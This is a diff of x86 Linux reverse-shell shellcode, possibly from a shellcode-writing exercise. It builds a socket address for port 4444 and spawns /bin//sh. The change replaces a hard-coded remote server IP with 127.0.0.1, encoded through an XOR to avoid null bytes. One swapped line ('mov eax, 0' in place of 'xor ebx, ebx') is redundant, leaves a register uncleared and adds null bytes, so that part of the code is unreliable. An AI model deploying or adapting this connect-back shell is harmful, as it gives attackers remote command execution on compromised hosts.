@@ -7,15 +7,17 @@ section .text
 
     ; clear required registers
     xor   eax, eax
-    xor   ebx, ebx
+    mov   eax, 0
     xor   ecx, ecx
     xor   edx, edx
 
     ; create sockaddr_in struct
     push  eax
     push  eax             ; [$esp]: 8 bytes of padding
-    mov   ebx, 0xc405210a ; Remote server IP
-    push  ebx             ; [$esp]: IP
+    mov   eax, 0xffffffff
+    mov   ebx, 0xfeffff80
+    xor   ebx, eax
+    push  ebx             ; [$esp]: 127.0.0.1
     push  word 0x5c11     ; [$esp]: 4444
     push  word 0x02       ; [$esp]: AF_INET
 
@@ -56,4 +58,3 @@ section .text
     mov   ebx, esp        ; [$ebx]: null terminated /bin//sh
     mov   al, 0x0b
     int   0x80
-
